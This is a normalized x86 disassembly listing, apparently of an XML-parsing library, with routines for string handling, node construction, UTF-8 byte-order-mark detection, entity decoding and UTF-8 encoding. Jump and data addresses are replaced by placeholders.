sub edi 0x1
jne r-xdata
mov edx [ edi ]
mov eax [ edx + 0x2c ]
mov ecx edi
call eax
test eax eax
jne r-xdata
mov ebp [ esp + 0x18 ]
sub_42b140
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov ebx [ ebp + 0x20 ]
add ebx 0x8
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ esp + 0x18 ]
sub eax edx
add edi 0x20
mov esi eax
call sub_42a390
mov eax [ ebp + 0xc ]
mov esi [ esp + 0x18 ]
mov [ esi + 0xc ] eax
mov ecx [ ebp + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
lea eax [ ebp + 0x2c ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x20 ]
cmp ecx eax
je r-xdata
mov ebp [ ebp + 0x18 ]
test ebp ebp
je r-xdata
mov ebp ecx
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
lea ecx [ ecx ]
mov ebp [ esp + 0x14 ]
mov esi [ esp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
add eax 0x8
push eax
mov eax [ esp + 0x1c ]
add eax 0x2c
add ebx 0x8
call sub_42bd30
mov edi eax
test edi edi
je r-xdata
mov edx [ ebp ]
mov eax [ edx + 0x3c ]
mov ecx ebp
call eax
mov ecx esi
call sub_42acf0
mov ebp [ ebp + 0x28 ]
test ebp ebp
jne r-xdata
mov ebp [ ebp + 0x20 ]
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
test ebp ebp
jne r-xdata
mov ecx [ ebp + 0x14 ]
cmp [ ecx ] 0x0
je r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
add edi 0x18
mov esi ecx
call sub_42a390
sub_42b210
push ebx
mov ebx [ esp + 0x8 ]
push edi
mov edi ecx
mov edx [ edi + 0x4c ]
lea ecx [ edi + 0x2c ]
mov eax edx
sub eax ecx
neg eax
sbb eax eax
and eax edx
mov edx [ ebx ]
push eax
mov eax [ edx + 0x4 ]
push edi
mov ecx ebx
call eax
test al al
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0xc ]
push edi
mov ecx ebx
call eax
pop edi
pop ebx
retn 0x4
push esi
mov esi [ edi + 0x18 ]
test esi esi
je r-xdata
pop esi
nop
mov esi [ esi + 0x28 ]
test esi esi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x40 ]
push ebx
mov ecx esi
call eax
test al al
je r-xdata
sub_42b270
push 0xffffffff
push sub_459b0b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x50
call sub_43fa1d
add esp 0x4
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x0
test eax eax
je r-xdata
xor esi esi
mov ecx [ edi + 0x20 ]
add ecx 0x8
push eax
call sub_42add0
mov esi eax
jmp r-xdata
push esi
push edi
call sub_42b140
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn
mov [ esp + 0x18 ] 0xffffffff
test esi esi
jne r-xdata
sub_42b300
push 0xffffffff
push sub_4594f3
mov eax [ fs : 0x0 ]
push eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x24 ]
xor eax eax
or ecx 0xffffffff
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0x4 ] ecx
mov [ ebp + 0xc ] eax
mov [ ebp + 0x20 ] rw-data
mov [ ebp + 0x10 ] eax
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x18 ] eax
mov [ ebp + 0x1c ] eax
mov [ ebp + 0x24 ] eax
mov [ ebp + 0x28 ] eax
mov [ esp + 0x1c ] eax
lea edi [ ebp + 0x34 ]
mov [ ebp ] r--data
mov [ edi ] rw-data
mov [ esp + 0x1c ] 0x1
mov [ ebp + 0x40 ] ecx
mov [ ebp + 0x3c ] ecx
xor esi esi
mov ebx r--data
mov [ ebp + 0x38 ] 0x4
mov [ ebp + 0x44 ] al
mov [ ebp + 0x2c ] al
mov [ ebp + 0x30 ] eax
call sub_42a390
xor eax eax
mov [ ebp + 0x40 ] eax
mov [ ebp + 0x3c ] eax
mov eax ebp
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn 0x4
sub_42b3b0
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ eax + 0x20 ]
push ebp
mov ebp [ esp + 0x10 ]
add ebx 0x8
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ ebp + 0x20 ]
mov esi eax
call sub_42a390
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
mov [ ebp + 0xc ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x4 ] edx
mov ecx [ eax + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov dl [ eax + 0x2c ]
mov [ ebp + 0x2c ] dl
mov ecx [ eax + 0x30 ]
mov [ ebp + 0x30 ] ecx
mov eax [ eax + 0x34 ]
mov esi [ eax ]
lea ebx [ eax + 0x8 ]
lea edi [ ebp + 0x34 ]
call sub_42a390
mov eax [ esp + 0x14 ]
mov edx [ eax + 0x38 ]
mov [ ebp + 0x38 ] edx
mov ecx [ eax + 0x3c ]
mov [ ebp + 0x3c ] ecx
mov edx [ eax + 0x40 ]
mov [ ebp + 0x40 ] edx
mov cl [ eax + 0x44 ]
mov [ ebp + 0x44 ] cl
mov esi [ eax + 0x18 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
nop
mov edx [ esi ]
mov eax [ edx + 0x3c ]
mov ecx esi
call eax
mov ecx ebp
call sub_42acf0
mov esi [ esi + 0x28 ]
test esi esi
jne r-xdata
sub_42b450
push 0xffffffff
push sub_459b0b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x48
call sub_43fa1d
add esp 0x4
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x0
test eax eax
je r-xdata
xor esi esi
push eax
call sub_42b300
mov esi eax
jmp r-xdata
push esi
push edi
call sub_42b3b0
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn
mov [ esp + 0x18 ] 0xffffffff
test esi esi
jne r-xdata
sub_42b4e0
push esi
mov esi [ ecx + 0x18 ]
test esi esi
je r-xdata
pop esi
retn 0x8
push ebx
mov ebx [ esp + 0x10 ]
push edi
mov edi [ esp + 0x10 ]
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push ebx
push edi
mov ecx esi
call edx
push r--data
push edi
call sub_4424c8
mov esi [ esi + 0x28 ]
add esp 0x8
test esi esi
jne r-xdata
pop edi
pop ebx
sub_42b520
push ebx
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ebx ecx
push ebx
mov ecx edi
call edx
test al al
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x10 ]
push ebx
mov ecx edi
call edx
pop edi
pop ebx
retn 0x4
push esi
mov esi [ ebx + 0x18 ]
test esi esi
je r-xdata
pop esi
mov edi edi
mov esi [ esi + 0x28 ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x40 ]
push edi
mov ecx esi
call edx
test al al
je r-xdata
sub_42b570
push 0xffffffff
push sub_459860
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x28 ]
mov ebx ecx
mov edi edx
mov eax rw-data
mov [ esp + 0x28 ] eax
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x14 ] eax
lea eax [ edi + 0x14 ]
push eax
lea esi [ esp + 0x2c ]
mov [ esp + 0x24 ] 0x1
call sub_42a9a0
add edi 0x18
push edi
lea esi [ esp + 0x1c ]
call sub_42a9a0
mov edi [ edi ]
add esp 0x8
cmp [ edi ] 0x0
jbe r-xdata
mov edi [ esp + 0x28 ]
mov esi [ esp + 0x14 ]
test ebx ebx
je r-xdata
mov cl [ edi + 0x8 ]
lea eax [ edi + 0x8 ]
test cl cl
je r-xdata
test ebp ebp
je r-xdata
lea ecx [ esi + 0x8 ]
push ecx
lea edx [ edi + 0x8 ]
push edx
push r--data
push ebx
call sub_4424c8
add esp 0x10
cmp cl 0x22
je r-xdata
cmp esi rw-data
je r-xdata
lea eax [ esp + 0x28 ]
mov ebx ebp
call sub_42a280
push r--data
call sub_42a560
lea eax [ esp + 0x14 ]
call sub_42a280
push r--data
jmp r-xdata
sub eax edi
sub eax 0x8
cmp eax 0xffffffff
jne r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
cmp edi rw-data
je r-xdata
push esi
call sub_43f960
add esp 0x4
mov ebx ebp
call sub_42a560
mov edi [ esp + 0x28 ]
mov esi [ esp + 0x14 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x4
push edi
call sub_43f960
add esp 0x4
test ebp ebp
je r-xdata
lea eax [ esi + 0x8 ]
push eax
lea ecx [ edi + 0x8 ]
push ecx
push r--data
push ebx
call sub_4424c8
add esp 0x10
lea eax [ esp + 0x28 ]
mov ebx ebp
call sub_42a280
push r--data
call sub_42a560
lea eax [ esp + 0x14 ]
call sub_42a280
push r--data
sub_42b6e0
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x10 ]
mov ebx ecx
test esi esi
jle r-xdata
mov eax [ ebx + 0x20 ]
add eax 0x8
push eax
push r--data
push edi
call sub_4424c8
add esp 0xc
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push edi
call sub_4424c8
add esp 0x8
sub esi 0x1
jne r-xdata
sub_42b740
push ecx
push ebp
push esi
mov esi ecx
push 0x2c
mov [ esp + 0xc ] esi
call sub_43fa1d
mov ebp eax
xor edx edx
add esp 0x4
cmp ebp edx
je r-xdata
pop esi
xor eax eax
pop ebp
pop ecx
retn
push ebx
or eax 0xffffffff
mov [ ebp + 0x8 ] eax
mov [ ebp + 0x4 ] eax
push edi
mov [ ebp + 0xc ] edx
mov [ ebp + 0x20 ] rw-data
lea edi [ ebp + 0x20 ]
mov [ ebp + 0x10 ] edx
mov [ ebp + 0x14 ] 0x2
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x1c ] edx
mov [ ebp + 0x24 ] edx
mov [ ebp + 0x28 ] edx
mov [ ebp ] r--data
mov ebx [ esi + 0x20 ]
add ebx 0x8
mov eax ebx
lea esi [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl dl
jne r-xdata
sub eax esi
mov esi eax
call sub_42a390
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0xc ]
mov [ ebp + 0xc ] ecx
mov edx [ eax + 0x4 ]
pop edi
mov [ ebp + 0x4 ] edx
mov eax [ eax + 0x8 ]
pop ebx
mov [ ebp + 0x8 ] eax
pop esi
mov eax ebp
pop ebp
pop ecx
retn
sub_42b7e0
push 0xffffffff
push sub_459828
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x2c ] 0x0
je r-xdata
mov [ esp + 0x24 ] rw-data
add ebx 0x20
push ebx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1c ] 0x0
call sub_42a9a0
mov esi [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
lea ecx [ esi + 0x8 ]
push ecx
push r--data
push edx
call sub_4424c8
add esp 0x10
cmp esi rw-data
je r-xdata
mov esi [ esp + 0x20 ]
push r--data
push esi
call sub_4424c8
mov edi [ esp + 0x2c ]
add esp 0x8
test edi edi
jle r-xdata
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xc
retn 0x8
push esi
call sub_43f960
add esp 0x4
mov eax [ ebx + 0x20 ]
add eax 0x8
push eax
push r--data
push esi
call sub_4424c8
add esp 0xc
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xc
retn 0x8
push r--data
push esi
call sub_4424c8
add esp 0x8
sub edi 0x1
jne r-xdata
sub_42b8c0
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ eax + 0x20 ]
push ebp
mov ebp [ esp + 0x10 ]
add ebx 0x8
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ ebp + 0x20 ]
mov esi eax
call sub_42a390
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
mov [ ebp + 0xc ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x4 ] edx
mov ecx [ eax + 0x8 ]
pop edi
mov [ ebp + 0x8 ] ecx
mov dl [ eax + 0x2c ]
pop esi
mov [ ebp + 0x2c ] dl
pop ebp
pop ebx
retn 0x8
sub_42b930
push 0xffffffff
push sub_459b0b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x30
call sub_43fa1d
add esp 0x4
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x0
test eax eax
je r-xdata
xor esi esi
push eax
call sub_42a760
mov esi eax
jmp r-xdata
push esi
push edi
call sub_42b8c0
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn
mov [ esp + 0x18 ] 0xffffffff
test esi esi
jne r-xdata
sub_42b9c0
push ebx
push ebp
push edi
mov edi [ esp + 0x10 ]
mov ebp ecx
test edi edi
je r-xdata
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
push r--data
push edi
call sub_4424c8
add esp 0x8
mov eax [ ebp + 0x2c ]
cmp [ eax ] 0x0
push esi
lea esi [ ebp + 0x2c ]
je r-xdata
push r--data
call sub_42a560
mov eax [ ebp + 0x30 ]
cmp [ eax ] 0x0
lea esi [ ebp + 0x30 ]
je r-xdata
test edi edi
je r-xdata
mov eax [ ebp + 0x34 ]
cmp [ eax ] 0x0
lea esi [ ebp + 0x34 ]
je r-xdata
test edi edi
je r-xdata
test ebx ebx
je r-xdata
add eax 0x8
push eax
push r--data
push edi
call sub_4424c8
add esp 0xc
pop esi
test edi edi
je r-xdata
test edi edi
je r-xdata
test ebx ebx
je r-xdata
add eax 0x8
push eax
push r--data
push edi
call sub_4424c8
add esp 0xc
push r--data
call sub_42a560
mov eax esi
call sub_42a280
push r--data
call sub_42a560
test ebx ebx
je r-xdata
push r--data
push edi
call sub_4424c8
add esp 0x8
test ebx ebx
je r-xdata
add eax 0x8
push eax
push r--data
push edi
call sub_4424c8
add esp 0xc
push r--data
call sub_42a560
mov eax esi
call sub_42a280
push r--data
call sub_42a560
pop edi
pop ebp
pop ebx
retn 0xc
push r--data
call sub_42a560
push r--data
call sub_42a560
mov eax esi
call sub_42a280
push r--data
call sub_42a560
sub_42bae0
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ eax + 0x20 ]
push ebp
mov ebp [ esp + 0x10 ]
add ebx 0x8
push esi
mov eax ebx
push edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ ebp + 0x20 ]
mov esi eax
call sub_42a390
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
mov [ ebp + 0xc ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x4 ] edx
mov ecx [ eax + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x2c ]
mov esi [ eax ]
lea ebx [ eax + 0x8 ]
lea edi [ ebp + 0x2c ]
call sub_42a390
mov edx [ esp + 0x14 ]
mov eax [ edx + 0x30 ]
mov esi [ eax ]
lea ebx [ eax + 0x8 ]
lea edi [ ebp + 0x30 ]
call sub_42a390
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x34 ]
mov esi [ eax ]
lea ebx [ eax + 0x8 ]
lea edi [ ebp + 0x34 ]
call sub_42a390
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_42bb80
push esi
push edi
push 0x38
mov edi ecx
call sub_43fa1d
mov esi eax
xor eax eax
add esp 0x4
cmp esi eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
or ecx 0xffffffff
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ecx
mov ecx rw-data
mov [ esi + 0xc ] eax
mov [ esi + 0x20 ] ecx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esi ] r--data
mov [ esi + 0x2c ] ecx
push esi
mov [ esi + 0x30 ] ecx
push edi
mov [ esi + 0x34 ] ecx
call sub_42bae0
pop edi
mov eax esi
pop esi
retn
sub_42bbe0
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x10 ]
mov ebx ecx
test esi esi
jle r-xdata
mov eax [ ebx + 0x20 ]
add eax 0x8
push eax
push r--data
push edi
call sub_4424c8
add esp 0xc
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push edi
call sub_4424c8
add esp 0x8
sub esi 0x1
jne r-xdata
sub_42bc40
push ecx
push ebp
push esi
mov esi ecx
push 0x2c
mov [ esp + 0xc ] esi
call sub_43fa1d
mov ebp eax
xor edx edx
add esp 0x4
cmp ebp edx
je r-xdata
pop esi
xor eax eax
pop ebp
pop ecx
retn
push ebx
or eax 0xffffffff
mov [ ebp + 0x8 ] eax
mov [ ebp + 0x4 ] eax
push edi
mov [ ebp + 0xc ] edx
mov [ ebp + 0x20 ] rw-data
lea edi [ ebp + 0x20 ]
mov [ ebp + 0x10 ] edx
mov [ ebp + 0x14 ] 0x3
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x1c ] edx
mov [ ebp + 0x24 ] edx
mov [ ebp + 0x28 ] edx
mov [ ebp ] r--data
mov ebx [ esi + 0x20 ]
add ebx 0x8
mov eax ebx
lea esi [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl dl
jne r-xdata
sub eax esi
mov esi eax
call sub_42a390
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0xc ]
mov [ ebp + 0xc ] ecx
mov edx [ eax + 0x4 ]
pop edi
mov [ ebp + 0x4 ] edx
mov eax [ eax + 0x8 ]
pop ebx
mov [ ebp + 0x8 ] eax
pop esi
mov eax ebp
pop ebp
pop ecx
retn
sub_42bce0
mov eax [ edi + 0x20 ]
push ebx
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ eax + 0x14 ]
mov edx esi
add ecx 0x8
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
pop ebx
retn
mov eax [ eax + 0x20 ]
cmp eax edi
jne r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
test ecx ecx
je r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sub_42bd30
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi eax
call sub_42bce0
xor ebx ebx
cmp eax ebx
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
push ebp
push 0x24
call sub_43fa1d
add esp 0x4
cmp eax ebx
je r-xdata
xor ebp ebp
or ecx 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov ecx rw-data
mov [ eax + 0xc ] ebx
mov [ eax ] r--data
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x20 ] ebx
mov [ eax + 0x1c ] ebx
mov ebp eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
lea edi [ ebp + 0x14 ]
mov esi eax
mov ebx edx
call sub_42a390
mov eax ebp
pop ebp
mov [ ebp + 0x20 ] edi
mov eax [ edi + 0x1c ]
mov [ ebp + 0x1c ] eax
mov ecx [ edi + 0x1c ]
mov edx esi
mov eax edx
mov [ ecx + 0x20 ] ebp
mov [ edi + 0x1c ] ebp
lea esi [ eax + 0x1 ]
sub_42bde0
movzx eax bl
push eax
call sub_4427fa
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x1
retn
cmp bl 0xa
je r-xdata
cmp bl 0xd
je r-xdata
retn
sub_42be10
push ebp
mov ebp [ esp + 0x8 ]
push esi
mov esi eax
cmp esi 0x1
jne r-xdata
mov [ ebp ] 0x1
jmp r-xdata
mov dl [ edi ]
movzx eax dl
mov eax [ eax * 4 + r--data ]
mov [ ebp ] eax
cmp eax esi
jne r-xdata
mov al [ edi ]
cmp al 0x26
jne r-xdata
test eax eax
je r-xdata
pop esi
mov [ ecx ] al
lea eax [ edi + 0x1 ]
pop ebp
retn
push esi
push ebp
push ecx
push edi
call sub_42c2c0
add esp 0x10
pop esi
pop ebp
retn
pop esi
xor eax eax
pop ebp
retn
xor esi esi
test dl dl
je r-xdata
mov eax [ ebp ]
pop esi
add eax edi
pop ebp
retn
mov eax edi
sub ecx edi
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
inc esi
cmp [ eax ] 0x0
jne r-xdata
cmp esi [ ebp ]
jge r-xdata
sub_42be90
sub esp 0x1c
push esi
xor esi esi
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] esi
mov [ esp + 0xc ] 0xc0
mov [ esp + 0x10 ] 0xe0
mov [ esp + 0x14 ] 0xf0
mov [ esp + 0x18 ] 0xf8
mov [ esp + 0x1c ] 0xfc
cmp eax 0x80
jae r-xdata
cmp eax 0x800
jae r-xdata
mov [ edx ] 0x1
jmp r-xdata
cmp eax 0x10000
jae r-xdata
mov [ edx ] 0x2
jmp r-xdata
mov esi [ edx ]
lea edx [ esi - 0x1 ]
add ecx esi
cmp edx 0x3
ja r-xdata
cmp eax 0x200000
jae r-xdata
mov [ edx ] 0x3
jmp r-xdata
pop esi
add esp 0x1c
retn
jmp [ edx * 4 + jump_table_42bf54 ]
mov [ edx ] esi
mov [ edx ] 0x4
mov dl al
and dl 0x3f
dec ecx
or dl 0x80
mov [ ecx ] dl
shr eax 0x6
mov dl al
and dl 0x3f
dec ecx
or dl 0x80
mov [ ecx ] dl
shr eax 0x6
mov dl al
and dl 0x3f
dec ecx
or dl 0x80
mov [ ecx ] dl
shr eax 0x6
mov dl [ esp + esi * 4 + 0x4 ]
or dl al
mov [ ecx - 0x1 ] dl
pop esi
add esp 0x1c
retn
sub_42bf90
push ebx
push ebp
mov ebp [ edi + 0xc ]
cmp ebp 0x1
jl r-xdata
pop ebp
pop ebx
retn 0x8
mov ecx [ edi + 0x8 ]
mov eax [ edi + 0x4 ]
push esi
mov esi [ edi ]
cmp ecx [ esp + 0x10 ]
jae r-xdata
mov [ edi ] esi
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ecx
movzx edx [ ecx ]
cmp edx 0xef
ja r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
movzx ebx [ edx + lookup_table_42c088 ]
jmp [ ebx * 4 + jump_table_42c070 ]
inc ecx
mov edx [ edx * 4 + r--data ]
test edx edx
jne r-xdata
inc ecx
inc esi
xor eax eax
cmp [ ecx ] 0xa
jne r-xdata
inc ecx
inc esi
xor eax eax
cmp [ ecx ] 0xd
jne r-xdata
cdq
idiv ebp
inc ecx
inc eax
imul eax ebp
jmp r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
pop esi
add ecx edx
jmp r-xdata
mov edx 0x1
cmp ecx [ esp + 0x10 ]
jb r-xdata
inc ecx
jmp r-xdata
inc ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
test bl bl
je r-xdata
inc eax
mov dl [ ecx + 0x2 ]
test dl dl
je r-xdata
cmp bl 0xbb
jne r-xdata
cmp bl 0xbf
jne r-xdata
cmp dl 0xbf
jne r-xdata
add ecx 0x3
jmp r-xdata
cmp dl 0xbe
jne r-xdata
add ecx 0x3
jmp r-xdata
cmp bl 0xbf
jne r-xdata
add ecx 0x3
jmp r-xdata
cmp dl bl
jne r-xdata
add ecx 0x3
jmp r-xdata
sub_42c08e
add eax 0x2010505
add eax 0x5050305
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcc040505
int3
sub_42c180
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
xor eax eax
pop ebx
retn
mov bl [ esi ]
test bl bl
je r-xdata
cmp [ esp + 0xc ] 0x1
jne r-xdata
movzx ecx bl
push ecx
call sub_4427fa
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ ecx ]
mov bl [ esi + 0x1 ]
inc esi
test bl bl
jne r-xdata
cmp bl 0xa
je r-xdata
movzx eax bl
push eax
call sub_4427fa
add esp 0x4
test eax eax
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0xbb
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp bl 0xd
jne r-xdata
inc esi
cmp bl 0xa
je r-xdata
cmp al 0xbf
jne r-xdata
cmp [ esi + 0x2 ] 0xbf
jne r-xdata
cmp bl 0xef
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp bl 0xd
jne r-xdata
cmp [ esi + 0x2 ] 0xbe
jne r-xdata
add esi 0x3
jmp r-xdata
cmp al 0xbf
jne r-xdata
add esi 0x3
jmp r-xdata
mov bl [ esi ]
test bl bl
jne r-xdata
cmp [ esi + 0x2 ] al
jne r-xdata
add esi 0x3
jmp r-xdata
sub_42c230
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov edi eax
xor esi esi
mov ebx r--data
call sub_42a390
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov al [ ebp ]
test al al
je r-xdata
cmp al 0x7f
jae r-xdata
mov ebx ebp
lea ecx [ ecx ]
movzx eax al
push eax
call sub_4426fa
add esp 0x4
test eax eax
jne r-xdata
mov esi ebp
sub esi ebx
test esi esi
jle r-xdata
cmp al 0x7f
jae r-xdata
cmp [ ebp ] 0x5f
jne r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
call sub_42a390
add ebp 0x1
jne r-xdata
movzx ecx al
push ecx
call sub_44287e
add esp 0x4
test eax eax
jne r-xdata
mov al [ ebp ]
test al al
je r-xdata
mov al [ ebp ]
cmp al 0x5f
je r-xdata
cmp al 0x2d
je r-xdata
cmp al 0x2e
je r-xdata
cmp al 0x3a
jne r-xdata
sub_42c2c0
mov eax [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
lea ebx [ ebp + 0x1 ]
mov [ eax ] 0x0
mov al [ ebx ]
push esi
push edi
test al al
je r-xdata
xor edi edi
mov esi rw-data
nop
cmp al 0x23
jne r-xdata
mov edx [ esp + 0x18 ]
lea eax [ edi + edi * 2 ]
add eax eax
mov cl [ eax + eax + rw-data ]
add eax eax
pop edi
mov [ edx ] cl
mov eax [ eax + rw-data ]
mov ecx [ esp + 0x18 ]
pop esi
add eax ebp
pop ebp
mov [ ecx ] 0x1
pop ebx
retn
add esi 0xc
inc edi
cmp esi rw-data
jl r-xdata
mov al [ ebp + 0x2 ]
